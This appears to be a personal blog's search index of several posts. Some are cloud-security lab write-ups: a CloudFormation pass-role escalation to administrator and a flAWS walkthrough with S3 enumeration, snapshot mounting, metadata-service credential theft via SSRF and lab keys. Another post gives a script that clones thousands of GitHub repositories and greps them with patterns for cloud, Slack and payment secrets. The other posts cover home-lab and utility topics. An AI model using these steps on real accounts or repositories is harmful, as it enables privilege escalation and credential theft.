'.RoleDetailList[] | select(.AssumeRolePolicyDocument.Statement[].Principal.Service==\"cloudformation.amazonaws.com\") | .RoleName'This role has the following inline policy →{ \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"iam:PutUserPolicy\" ], \"Effect\": \"Allow\", \"Resource\": \"*\" } ]}Therefore, the CFN stack would be able to add an inline policy for a user. So, a malicious template is created as follows →{ \"Resources\": { \"tanqtemplate\": { \"Type\": \"AWS::IAM::Policy\", \"Properties\": { \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Resource\": \"*\", \"Action\": \"*\" } ] }, \"Users\": [ \"student\" ], \"PolicyName\": \"cfn_admin_policy_via_exploit\" } } }}This is then passed to the command used to create a CFN stack as follows →awsn cloudformation create-stack \\--role-arn \"arn:aws:iam::896825229505:role/lab12CFDeployRole\" \\--template-body file://template.json --stack-name \"pass-role-exploit-cfn\" \\--capabilities \"CAPABILITY_NAMED_IAM\"The CAPABILITY_NAMED_IAM capability must be passed since the template is making changes to the account using a policy which is custom and thus, “named”. This will create the stack and the creation or created status can be monitored by using the following command →# just describeawsn cloudformation describe-stacks --stack-name \"pass-role-exploit-cfn\"# get eventsawsn cloudformation describe-stack-events --stack-name \"pass-role-exploit-cfn\"Once this is created, the policy takes effect and the inline policies will show the new policy for student which grants it administrator privileges. This solves the lab." }, { "title": "SnapDrop Local Container in Home Lab", "url": "/blog/posts/homelab-snapdrop-local/", "categories": "Home Server", "tags": "home-lab, snapdrop", "date": "2022-04-24 03:00:00 -0400", "snippet": " As explained below, the WebRTC-based Snapdrop uses TURN (Traversal Using Relays around NAT) for the publicly available instance when a peer-peer connection cannot be established, and SnapDrop use...", "content": " As explained below, the WebRTC-based Snapdrop uses TURN (Traversal Using Relays around NAT) for the publicly available instance when a peer-peer connection cannot be established, and SnapDrop uses its public TURN servers for that. Now, all that and more has been solved by another project that I created - Local Content Share. To learn more about how that works, read my blog in the Home Lab series - Local Content Share in Home Lab.DeploymentUse this repo for deployment. SnapDrop is an open-source WebRTC based app inspired by Apple’s AirDrop. It works out of the box by visiting the link. However, WebRTC apps rely on STUN and TURN servers and may follow a network path that is not secure or completely local. Therefore, I made an edit to the LinuxServer.IO image dockerfile in the repo mentioned earlier to modify it such that the app just uses the local network and relies on the network address as that of the local router. The command to run the modified image is as follows →mkdir -p $HOME/snapdropdocker run -d \\--name=snapdrop_variant \\-e PUID=1000 \\-e PGID=1000 \\-e TZ=America/Chicago \\-p 80:80 \\-p 443:443 \\-v $HOME/snapdrop:/config \\--restart unless-stopped \\tanq16/linuxserver_snapdrop_local_onlyPreBuiltThe docker hub variant is not something I regularly update and build, so a local build may be necessary by cloning the original repository, making the change that I made (check the latest commit on my repository if needed), and building using the command →docker build -t linuxserver_snapdrop_local_only .Once built and deployed on the home-lab server, just visit https://&lt;server&gt; on two devices that need to share text or files and use the naming scheme and the UI to perform the sharing. Look at the MD Dumpster blog post for another local sharing implementation that I made. However, I still recommend using Local Content Share in Home Lab." }, { "title": "Plex Media Server in Home Lab", "url": "/blog/posts/homelab-plex/", "categories": "Home Server", "tags": "home-lab, plex", "date": "2022-04-24 03:00:00 -0400", "snippet": "Note: Jellyfin is a pretty similar option with an easier setup and one that I switched over to from Plex. Check out my guide.DeploymentDockerHubThe best way to use Plex Media Server in my opinion i...", "content": "Note: Jellyfin is a pretty similar option with an easier setup and one that I switched over to from Plex. Check out my guide.DeploymentDockerHubThe best way to use Plex Media Server in my opinion is to use a docker container. Plex offers a docker image that can be used. The command to run the container is as follows →mkdir -p $HOME/plex/{config,transcode}# replace the media mount with an appropriate directorydocker run \\-d --restart=unless-stopped --net=host \\--name plex \\-e TZ=\"America/Chicago\" -e PLEX_UID=1000 -e PLEX_GUID=1000 \\-e PLEX_CLAIM=\"\" \\-v $HOME/plex/config:/config \\-v $HOME/plex/transcode:/transcode \\-v /media/tanq/Tanishq/Media:/data \\plexinc/pms-dockerEnsure that the PLEX_CLAIM token is accurate and taken from this link. The three main volume mounts here are needed as follows → /config and /transcode → used to maintain state, watch history, etc. /data → preferably mount an external hard disk with shows, movies, etc.Setup and Data FormatAfter starting the container, if the plex claim code was included, log in with the account at http://&lt;serverIP&gt;:32400/web to setup the server with your Plex account.For the main media store, the data should be formated as best as possible. The way Plex works is it reads the metadata of files and names of folders and files to guess the TV show or movie name and pull details from multiple sources to display that information to the user. But it often misses, specially if that metadata isn’t present or data has been downloaded from multiple sources. Therefore, it’s best to follow a directory and naming structure that Plex can understand and get accurate details for.For TV shows and Anime, TVDB is the best source and for movies, TMDB is the best. The idea is that the naming for each folder (or a single file if needed for movies) should be named with the following format →&lt;NAME&gt; (Year) {tvdb-&lt;id&gt;} The tvdb and tmdb IDs can be obtained by visiting the show on the respective DB sites. The sites also list the full name and year, both of which are also important for perfect matches.Ensuring this naming scheme is the best way to avoid any issues with content match. After that, everything’s good to go!" }, { "title": "H1B Lottery Simulator", "url": "/blog/posts/h1b-lottery-simulator/", "categories": "Computers and Fun", "tags": "programming, h1b", "date": "2022-04-02 03:00:00 -0400", "snippet": "The following code is a simulation for the H1B lottery selection process. This script takes into account all years of the lottery and gives a guess of whether you’ll be selected in the 3 years or n...", "content": "The following code is a simulation for the H1B lottery selection process. This script takes into account all years of the lottery and gives a guess of whether you’ll be selected in the 3 years or not. It can also take into account whether you’re an advanced degree candidate or not. This simulation can be run in a for loop unattended with output being redirected to a file for calculations. Example → run the code 5000 times and grep the output for required items to calculate percentages such as likelihood of selected in the first year, or in the lotteries that can occur in the middle of the year.import sysimport random# Assumes lottery is filed for a total of 3 times (typical)def do_lottery(id): # Lottery for the Advanced Degree set for i in range(20000): temp = random.randint(1, 80000) if temp == id: print(\"Congratulations!\") return 1 # Lottery for the remaining set for i in range(65000): temp = random.randint(1, 280000) if temp == id: print(\"Congratulations!\") return 1 # Lottery that may happen middle of the year for i in range(10000): temp = random.randint(1, 210000) if temp == id: print(\"Congratulations - middle of the year!\") return 1 return 0# Set the argument as \"masters\" if applicant has advanced degreeif len(sys.argv) &gt; 1 and sys.argv[1] == \"masters\": your_id = random.randint(1, 20000)else: your_id = random.randint(20001, 85000)print(\"\\n==============================\")print(\"Year 1 Lottery\")accepted = do_lottery(your_id)if accepted: print(\"You got it in the first year!!\\n==============================\") exit()print(\"Year 2 Lottery\")accepted = do_lottery(your_id)if accepted: print(\"You got it in the second year!!\\n==============================\") exit()print(\"Year 3 Lottery\")accepted = do_lottery(your_id)if accepted: print(\"You got it in the third year!!\\n==============================\") exit()print(\"Unlucky!!\\n==============================\")" }, { "title": "flAWS 1", "url": "/blog/posts/flaws-1/", "categories": "Lab Practice Notes, AWS Labs", "tags": "aws, lab, flaws1, security", "date": "2022-03-31 03:00:00 -0400", "snippet": "Level 1 This level is buckets of fun. See if you can find the first sub-domain.Begin with doing a dig of flaws.cloud, which returns the following →; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;...", "content": "Level 1 This level is buckets of fun. See if you can find the first sub-domain.Begin with doing a dig of flaws.cloud, which returns the following →; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; flaws.cloud;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 55678;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096; COOKIE: 85e57acc1b19ec52 (echoed);; QUESTION SECTION:;flaws.cloud. IN A;; ANSWER SECTION:flaws.cloud. 15 IN A 52.92.212.219;; Query time: 531 msec;; SERVER: 192.168.65.5#53(192.168.65.5);; WHEN: Thu Mar 31 21:09:06 CDT 2022;; MSG SIZE rcvd: 79Then do an nslookup for the IP found, which gives the following →219.212.92.52.in-addr.arpa name = s3-website-us-west-2.amazonaws.com.Authoritative answers can be found from:This gives hint of a static website running from S3 at s3-website-us-west-2.amazonaws.com. This also confirms that the non-DNS URL for the challenge is at flaws.cloud.s3-website-us-west-2.amazonaws.com.Now, a new profile for flaws can be created with the region set to us-west-2 and given that S3 is being used, permissions can be checked using the following →# no sign request is used to call without credentialsawsn s3 ls s3://flaws.cloud --no-sign-request --profile flawsThis gives the result →2017-03-13 22:00:38 2575 hint1.html2017-03-02 22:05:17 1707 hint2.html2017-03-02 22:05:11 1101 hint3.html2020-05-22 13:16:45 3162 index.html2018-07-10 11:47:16 15979 logo.png2017-02-26 19:59:28 46 robots.txt2017-02-26 19:59:30 1051 secret-dd02c7c.htmlrobots.txt and secret-dd02c7c.html seem interesting.These can be retrieved using the command →aws s3 cp s3://flaws.cloud/robots.txt ./The robots file did not give anything but the secret file gave the link to the next level as http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud. Files can also be listed by directly going to flaws.cloud.s3.amazonaws.com.Level 2 The next level is fairly similar, with a slight twist. You’re going to need your own AWS account for this. You just need the free tier.Calling s3 ls again on the discovered bucket gives an access denied message →aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --no-sign-requestHowever, calling it with a valid profile lists the bucket which means that the bucket did not have proper permissions configured i.e., it allowed everyone to list items and get items. Retrieving the secret file gives the URL for the next level as → http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud.Level 3 The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you’ll find something that will let you list what other buckets are.Listing the contents like previous parts gives a .git folder in the contents. Pulling that down as follows →aws s3 cp --recursive s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git ./git_stuff/Running a secret scan in all commits using →for i in $(git --no-pager log | grep \"^commit\" | cut -d ' ' -f2); do git checkout $i 1&gt;/dev/null 2&gt;/dev/null; zsh /persist/secret_scan.sh; doneThis gives a secret → access_keys.txt:1:AKIAJ3...JKT7SA and access_keys.txt:2:secret_access_key OdNa7m+bqUvF3...kBpqcBTTjqwP83JysUsing this as a profile, all S3 buckets can be listed using →awsn s3 ls --proile flawsThis gives the following output →2017-02-12 15:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud2017-05-29 11:34:53 config-bucket-9754262620292017-02-12 14:03:24 flaws-logs2017-02-04 21:40:07 flaws.cloud2017-02-23 19:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud2017-02-26 12:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud2017-02-26 12:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud2017-02-26 13:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud2017-02-26 13:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud2017-02-26 14:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloudThis is all the S3 buckets which are also the further levels.Level 4Visiting the bucket static website at → http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/ For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud It’ll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.Using aws sts get-caller-identitity --profile flaws it gives the name of the account which is backup.The questions says that a snapshot was made from the EC2 instance running the website. Using aws ec2 describe-instances, there is an instance owned by the backup user.Listing all snapshots using aws ec2 describe-snapshots prints a ton of text, therefore, we filter using the owner ID such that the owner is the backup user. This is done by using aws ec2 describe-snapshots --owner-id 975426262029 which gives the result →{ \"Snapshots\": [ { \"Description\": \"\", \"Encrypted\": false, \"OwnerId\": \"975426262029\", \"Progress\": \"100%\", \"SnapshotId\": \"snap-0b49342abd1bdcb89\", \"StartTime\": \"2017-02-28T01:35:12+00:00\", \"State\": \"completed\", \"VolumeId\": \"vol-04f1c039bc13ea950\", \"VolumeSize\": 8, \"Tags\": [ { \"Key\": \"Name\", \"Value\": \"flaws backup 2017.02.27\" } ], \"StorageTier\": \"standard\" } ]}On checking the permissions for the volume using →awsn ec2 describe-snapshot-attribute --attribute createVolumePermission --snapshot-id snap-0b49342abd1bdcb89 --profile flaws --region us-west-2The result is as follows →{ \"CreateVolumePermissions\": [ { \"Group\": \"all\" } ], \"SnapshotId\": \"snap-0b49342abd1bdcb89\"}By default snapshots are private, and you can transfer them between accounts securely by specifying the account ID of the other account, but a number of people just make them public and forget about them.Therefore, creating a volume from this within personal account using →awsn ec2 create-volume --snapshot-id snap-0b49342abd1bdcb89 --availability-zone us-west-2a --region us-west-2It must be in the same region as the snapshot because snapshots cannot be shared on other regions. The result is as follows →{ \"AvailabilityZone\": \"us-west-2a\", \"CreateTime\": \"2022-04-01T15:48:24+00:00\", \"Encrypted\": false, \"Size\": 8, \"SnapshotId\": \"snap-0b49342abd1bdcb89\", \"State\": \"creating\", \"VolumeId\": \"vol-08854891211c6fec5\", \"Iops\": 100, \"Tags\": [], \"VolumeType\": \"gp2\", \"MultiAttachEnabled\": false}Now, an EC2 instance can be created from the console in the same AZ and then this volume can be attached to its storage.Upon attaching the volume to the instance, it can be mounted as follows →lsblk# This gives the volume /dev/xvdf1 as a new volume This should be from the snapshotsudo mount /dev/xvdf1 /mnt# This mounts it to the /mnt directorySearching the file system, there is a /home directory for users on the system and the only user there is ubuntu. Since this snapshot was taken after the NGINX web server was configured and launched, there must be some data relevant to it. Under ubuntu‘s home directory, there is a script setupNginx.sh which has the following in it →htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjy...Ju7rw5Ro68iE8MThis gives the password for the web server running in the EC2 instance at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud.Level 5 This EC2 has a simple HTTP only proxy on it. Here are some examples of it’s usage:http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xmlhttp://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/See if you can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it. Visiting the page directly at http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ gives the error of → Level 6 is hosted in a sub-directory, but to figure out that directory, you need to play level 5 properly.One of the most common ways to escalate an SSRF in an AWS Cloud environment is the (mis)use of the AWS Metadata API. Therefore, accessing the APIPA address, metadata can be obtained. There is a role under security-credentials i.e., the role of flaws has been attached to the EC2 instance.Therefore, using the access key ID. secret access key and the session token, the role can effectively be assumed →[flaws2]aws_access_key_id = ASIA6GG7PSQGUEOUS2GFaws_secret_access_key = hrPK9j2qJ8nB3tSBsAwQ7/dauDE6dAOdRAwvaAUSaws_session_token = IQoJb3JpZ2luX2VjEJn/....redacted....q+XnpTW+fg==Using this to get the contents of the level6 S3 bucket as follows → awsn s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ --profile flaws2This gives the name of the directory where the next level is located.Level 6 For this final challenge, you’re getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account.Access key ID: AKIAJ...57Q3OBGASecret: S2IpymMBlV....XrYxZYhP+dZ4ps+uAdding these credentials to the credentials file grants us the user Level6.The SecurityAudit group can get a high level overview of the resources in an AWS account, but it’s also useful for looking at IAM policies. To find information about the user, use →awsn iam get-user --profile level6flawsThis returns →{ \"User\": { \"Path\": \"/\", \"UserName\": \"Level6\", \"UserId\": \"AIDAIRMD...DWOG6A\", \"Arn\": \"arn:aws:iam::975426262029:user/Level6\", \"CreateDate\": \"2017-02-26T23:11:16+00:00\" }}Overview of the account can be retrieved using this role by using iam get-account-summary and all policies can be retrieved by using list-policies, however, that lists a complete bunch of policies (including AWS managed ones). Therefore, to retrieve the policies attached to the current user, use iam list-user-attached-policies --user-name Level6 and this gives the result →{ \"AttachedPolicies\": [ { \"PolicyName\": \"list_apigateways\", \"PolicyArn\": \"arn:aws:iam::975426262029:policy/list_apigateways\" }, { \"PolicyName\": \"MySecurityAudit\", \"PolicyArn\": \"arn:aws:iam::975426262029:policy/MySecurityAudit\" } ]}The MySecurityAudit policy is the one that allows us to do everything we are able to do. The other policy could be interesting. To get information about a policy use →awsn iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --profile level6flawsThis gives the information on the policy as →{ \"Policy\": { \"PolicyName\": \"list_apigateways\", \"PolicyId\": \"ANPAIRLWTQMGKCSPGTAIO\", \"Arn\": \"arn:aws:iam::975426262029:policy/list_apigateways\", \"Path\": \"/\", \"DefaultVersionId\": \"v4\", \"AttachmentCount\": 1, \"PermissionsBoundaryUsageCount\": 0, \"IsAttachable\": true, \"Description\": \"List apigateways\", \"CreateDate\": \"2017-02-20T01:45:17+00:00\", \"UpdateDate\": \"2017-02-20T01:48:17+00:00\", \"Tags\": [] }}With the version ID known, information about that version can be retrieved using →awsn iam get-policy-version --version-id v4 --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --profile level6flawsThis gives the result →{ \"PolicyVersion\": { \"Document\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"apigateway:GET\" ], \"Effect\": \"Allow\", \"Resource\": \"arn:aws:apigateway:us-west-2::/restapis/*\" } ] }, \"VersionId\": \"v4\", \"IsDefaultVersion\": true, \"CreateDate\": \"2017-02-20T01:48:17+00:00\" }}This says that the policy allows the Level6 user to call apigateway:GET on the API Gateway for restapis/*. However, the user cannot perform a GET on the list of APIs themselves, just a specific one which has a policy attached to allow it.Therefore, listing the capabilities using the policy MySecurityAudit, there are a number of services that the user can retrieve information for. Trying a few, lands us at Lambda, where functions can be listed as follows →awsn lambda list-functions --profile level6flaws --region us-west-2This gives the result →{ \"Functions\": [ { \"FunctionName\": \"Level6\", \"FunctionArn\": \"arn:aws:lambda:us-west-2:975426262029:function:Level6\", \"Runtime\": \"python2.7\", \"Role\": \"arn:aws:iam::975426262029:role/service-role/Level6\", \"Handler\": \"lambda_function.lambda_handler\", \"CodeSize\": 282, \"Description\": \"A starter AWS Lambda function.\", \"Timeout\": 3, \"MemorySize\": 128, \"LastModified\": \"2017-02-27T00:24:36.054+0000\", \"CodeSha256\": \"2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=\", \"Version\": \"$LATEST\", \"TracingConfig\": { \"Mode\": \"PassThrough\" }, \"RevisionId\": \"98033dfd-defa-41a8-b820-1f20add9c77b\", \"PackageType\": \"Zip\", \"Architectures\": [ \"x86_64\" ], \"EphemeralStorage\": { \"Size\": 512 } } ]}Of the actions allowed in the MySecurityAudit policy, the user can also get the policy attached to the function. Therefore using the following to print the JSON policy →awsn lambda get-policy --function-name Level6 --profile level6flaws --region us-west-2 | python3 -c 'import json; input(); x = input(); print(json.loads(x.split(\": \")[1][:-1]))' | python3 -m json.toolThis gives the policy as →{ \"Version\": \"2012-10-17\", \"Id\": \"default\", \"Statement\": [ { \"Sid\": \"904610a93f593b76ad66ed6ed82c0a8b\", \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"apigateway.amazonaws.com\" }, \"Action\": \"lambda:InvokeFunction\", \"Resource\": \"arn:aws:lambda:us-west-2:975426262029:function:Level6\", \"Condition\": { \"ArnLike\": { \"AWS:SourceArn\": \"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\" } } } ]}This shows that the API Gateway is allowed to Invoke the Lambda function if the ARN matches arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6. This means that the Rest API name to invoke it must be s33ppypa75. Using API Gateway to get information for this API as follows →awsn apigateway get-rest-api --rest-api-id s33ppypa75 --profile level6flaws --region us-west-2This gives the results as →{ \"id\": \"s33ppypa75\", \"name\": \"Level6\", \"createdDate\": \"2017-02-26T18:21:35-06:00\", \"apiKeySource\": \"HEADER\", \"endpointConfiguration\": { \"types\": [ \"EDGE\" ] }, \"tags\": {}, \"disableExecuteApiEndpoint\": false}This shows that the Execute API Endpoint has not been disabled i.e., it can be reached via a URL to call the API. The default endpoint for Execute API for an API is as follows →https://{restapi_id}.execute-api.{region}.amazonaws.com/{stage_name}/Therefore, a stage name is needed, which can be retrieved from get-stages subcommand that gives the following result →{ \"item\": [ { \"deploymentId\": \"8gppiv\", \"stageName\": \"Prod\", \"cacheClusterEnabled\": false, \"cacheClusterStatus\": \"NOT_AVAILABLE\", \"methodSettings\": {}, \"tracingEnabled\": false, \"createdDate\": \"2017-02-26T18:26:08-06:00\", \"lastUpdatedDate\": \"2017-02-26T18:26:08-06:00\" } ]}Next, the resources need to be identified within the stage that can be called. This is done by using the get-resources subcommand which gives the following result →{ \"items\": [ { \"id\": \"6m5gni\", \"parentId\": \"y8nk5v2z1h\", \"pathPart\": \"level6\", \"path\": \"/level6\", \"resourceMethods\": { \"GET\": {} } }, { \"id\": \"y8nk5v2z1h\", \"path\": \"/\" } ]}Therefore, the URL is as follows →https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6If the last level6 is not included, it is the root resource that is called, otherwise it is the user resource when specified. A curl request on this URL gives the following →Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/That’s the end of the Challenge." }, { "title": "10k GitHub Repositories Secret Scanning Code", "url": "/blog/posts/github-secret-scan/", "categories": "Computers and Security", "tags": "github, programming, secret-scan, security", "date": "2022-03-10 02:00:00 -0500", "snippet": "The API used to search git repositories is →https://api.github.com/search/repositoriesThe code to pull 10000 repositories’ URLs is as follows →import timeimport jsonimport requestsgithub_urls = []s...", "content": "The API used to search git repositories is →https://api.github.com/search/repositoriesThe code to pull 10000 repositories’ URLs is as follows →import timeimport jsonimport requestsgithub_urls = []stars = ['0..1', '2..3', '4..5', '6..8', '9..11', '12..15', '16..20', '21..25', '26..40', '41..60', '61..90', '91..120', '121..150']for star_count in stars: for i in range(10): r = requests.get(\"https://api.github.com/search/repositories?q=stars:\" + star_count + \"&amp;per_page=100&amp;page=\" + str(i), headers = {\"Accept\": \"application/vnd.github.v3.text-match+json\"}) data = json.loads(r.text) print(star_count, i, data['total_count']) if not 'total_count' in data.keys(): time.sleep(7) continue for j in data['items']: github_urls.append(j['html_url']) time.sleep(8)file = open(\"github.urls\", \"w\")for i in github_urls: file.write(i) file.write(\"\\n\")file.close()To clone all repos, use the following snippet →for i in $(head -n 1000 ~/github.urls | sort -u); do git clone --depth=1 $i; sleep 5; doneSecrets can be found using the following bash script →echo \"======AWS API Key\"grep -niroE \"\\b((A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16})\\b\" --exclude-dir \".git/\"echo \"======AWS Secret Access Key\"grep -niroE \"\\baws_?(secret)?_?(access)?_?(key)?.?\\s{0,30}.?\\s{0,30}.?([a-z0-9/+=]{40})\\b\" --exclude-dir \".git/\"echo \"======AWS Account ID\"grep -niroE \"aws_?(account)_?(id)?.?\\s{0,30}.?\\s{0,30}.?([0-9]{4}-?[0-9]{4}-?[0-9]{4})\" --exclude-dir \".git/\"echo \"======AWS Session Token\"grep -niroE \"(aws.?session|aws.?session.?token|aws.?token).?\\s{0,30}.?\\s{0,30}.?([a-z0-9/+=]{16,200})[^a-z0-9/+=]\" --exclude-dir \".git/\"echo \"======Slack Token\"grep -niroE \"\\b(xox[pboa]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})\\b\" --exclude-dir \".git/\"echo \"======Generic Secrets &amp; Keys\"grep -niroE \"(sshpass|password|pass|pw|secret|key|api|access).?(key)?.{0,20}\\b([0-9a-z]{24,64})\\b\" --exclude-dir \".git/\"echo \"======Google OAuth Client ID\"grep -niroE \"([0-9]+-[a-z0-9_]{32})\\.apps\\.googleusercontent\\.com\" --exclude-dir \".git/\"echo \"======Google OAuth Client Secret\"grep -niroE '.?client_secret.?\\s{0,30}.?\\s{0,30}\"([a-zA-Z0-9_-]{24})\"' --exclude-dir \".git/\"echo \"======Google OAuth Access Token\"grep -niroE \"\\b(ya29\\.[0-9A-Za-z_-]{20,64})\\b\" --exclude-dir \".git/\"echo \"======Google API Keys\"grep -niroE \"\\b(AIza[0-9A-Za-z_-]{35})\\b\" --exclude-dir \".git/\"echo \"======Stripe API Key\"grep -niroE \"\\b((sk|rk)_live_[a-z0-9]{24})\\b\" --exclude-dir \".git/\" # live can be substituted for test to get test keysecho \"======GitHub App|Refresh|Personal|OAuth Access Token\"grep -niroE \"\\b((ghr|gho|ghp|ghu|ghs)_[a-zA-Z0-9]{36})\\b\" --exclude-dir \".git/\"echo \"======Twilio API Key\"grep -niroE \"twilio.{0,20}\\b(sk[a-f0-9]{32})\\b\" --exclude-dir \".git/\"echo \"======Facebook Access Token\"grep -niroE \"\\b(EAACEdEose0cBA[a-zA-Z0-9]+)\\b\" --exclude-dir \".git/\"echo \"======Twitter Access Token\"grep -niroE \"twitter[\\s.]{1,4}[1-9][0-9]+-[0-9a-zA-Z]{40}\" --exclude-dir \".git/\"echo \"======Okta API Token\"grep -niroE \"(okta|ssws).{0,20}\\b(00[a-z0-9_-]{39})[a-z0-9_]\\b\" --exclude-dir \".git/\"echo \"======bCrypt Hashes\"grep -niroE \"(\\$2[abxy]\\$\\d+\\$[./A-Za-z0-9]{53})\" --exclude-dir \".git/\"It can be invoked as follows →zsh secret_scan.sh | tee -a ~/secret_scan.logTo scan for multiple commits in a git repo, use the following →for i in $(git --no-pager log | grep \"^commit\" | cut -d ' ' -f2); do git checkout $i 1&gt;/dev/null 2&gt;/dev/null; zsh /persist/secret_scan.sh; done | tee -a secret_scan.logThe following script can convert the results to a JSON object and store in secret_scan.json. It can remove duplicate keys from the same file.import sysimport jsonif len(sys.argv) &gt; 1: filename = sys.argv[1]else: filename = \"secret_scan.log\"f = open(filename)data = f.read().split(\"\\n\")[:-1]f.close()collection = {}final = {}index = \"\"for i in data: if i[:6] == \"======\": index = i[6:] if not index in collection.keys(): collection[index] = [] else: collection[index].append(i)for index in collection.keys(): if len(collection[index]) == 0: continue else: x = sorted(collection[index]) check = x[0] y = [] y.append(check) for i in range(1, len(x)): splitone = check.split(':') splittwo = x[i].split(':') if splitone[0] == splittwo[0] and splitone[-1] == splittwo[-1]: continue else: check = x[i] y.append(check) final[index] = yf= open(\"secret_scan.json\", \"w\")f.write(json.dumps(final))f.close()" }, { "title": "Unified Ecosystem - Best Software/Applications", "url": "/blog/posts/unified-ecosystem/", "categories": "Computers Newbified", "tags": "productivity, ecosystem, application", "date": "2022-02-23 02:00:00 -0500", "snippet": "Bookmark Manager Toby Raindrop.io Notion BookySelf-Hosted Options LinkAce ShioriNote Taking Notion Obsidian Microsoft OneNote Evernote LogSeq SimpleNote MilanoteApple Only Craft Docs ...", "content": "Bookmark Manager Toby Raindrop.io Notion BookySelf-Hosted Options LinkAce ShioriNote Taking Notion Obsidian Microsoft OneNote Evernote LogSeq SimpleNote MilanoteApple Only Craft Docs Bear NotedInstant Messaging Telegram WhatsApp Signal MessengerSocial/Team Chat + Collaboration Discord Slack Microsoft Teams FleepSelf-Hosted Options Rocket Chat MattermostPassword Manager Dashlane 1Password Bitwarden PadLocVPN Surfshark Nord Express VPN Proton VPN Mozilla VPN Psiphon WindscribeFinance Tracking Spendee BudgE Docker Image by LSIO NerdWallet YNAB Mint by Intuit NotionFeeds Consolidator Inoreader Feedly Google News FlipboardMusic Streaming Spotify Apple Music YouTube Music Amazon MusicCloud Storage Google Drive Box Mega Drive Icedrive Dropbox DigiBoxx (Specially for India)Reminders and To-Do lists TickTick Todoist Microsoft ToDo Notion Tasks (Google Calendar)Project Management and Collaboration Notion ClickUp Asana + Jira Monday.com AirtableEmail + Calendar Gmail by Google Proton Mail Microsoft OutlookEmail Aggregator Application Spark Outlook MissivePrivate Email Alias System SimpleLogin Firefox Relay AnonAddyMoney Transfers Wise Xoom RemitlyBrowser Brave Browser Google Chrome Microsoft Edge Firefox Opera Vivaldi BrowserSocial Platforms Reddit LinkedIn Twitter Instagram FacebookAuthenticator App Authy Microsoft Authenticator App LastPass Authenticator Google Authenticator - (App Store, Play Store)AdBlockers AdGuard Brave Browser Adblock Plus uBlock OriginSelf-Hosted Options AdGuard Home PiHoleFile Sharing Bitwarden Send SnapDrop ShareDrop For a Home Lab, check out Local Content ShareFor a self-hosted option, check out Project Send." }, { "title": "Battery Monitor via Discord WebHooks and Siri Shortcuts", "url": "/blog/posts/homelab-server-battery-level/", "categories": "Home Server", "tags": "home-lab, webhooks, discord, siri-shortcuts, battery-monitor", "date": "2022-02-18 07:00:00 -0500", "snippet": "The What and WhyThis post details how Siri shortcuts and discord webhooks can be used in tandom with a smart plug to turn a server charger on or off based on battery levels. This is generally only ...", "content": "The What and WhyThis post details how Siri shortcuts and discord webhooks can be used in tandom with a smart plug to turn a server charger on or off based on battery levels. This is generally only helpful for servers that are actually laptops ith decent battery that needs to be preserved rather than keeping it plugged in for long. Another more centralized way to do that would be to use open source Home Assistant docker container with supported smart plugs to do everything directly from the server. This post deals with doing it via Siri shortcuts instead, since that was what I had available for the HomeKit supported devices I own.The other purpose of these notifications are to just tell the owner about battery status of several server devices in the home network whose charge is about to run out or might be on charge for a while, such as plugging the server in when it is nearing around 20% charge capacity and unplugging it once it reaches 100% charge and stays connected. The notifications can help in manually turning the plug on or off.This post will go over 2 possible methods, the first one to just inform about battery levels, the second to automatically perform an action via Siri shortcuts. Obviously, Siri shortcuts can be replaced with anything else that fulfils the purpose, but I only had that to experiment with at the time.Notifications via Discord WebHooksThe following code reads the battery energy level now as well as the full capacity. It also reads the status of the AC adapter and follows the cron job 